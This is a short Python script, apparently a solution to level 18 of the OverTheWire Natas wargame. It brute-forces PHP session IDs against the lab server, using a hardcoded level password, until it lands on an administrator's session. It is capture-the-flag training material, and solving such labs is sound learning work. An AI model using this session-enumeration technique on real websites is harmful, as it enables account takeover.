# -*- coding: utf-8 -*-
"""
Created on Mon Mar  9 20:57:03 2015

@author: George
"""

import requests
 
for sessid in range(641): 
    r = requests.get('http://natas18.natas.labs.overthewire.org',
        auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
        cookies={'PHPSESSID':str(sessid)})
    if "You are logged in as a regular user." not in r.content:
        print r.content, sessid
        break
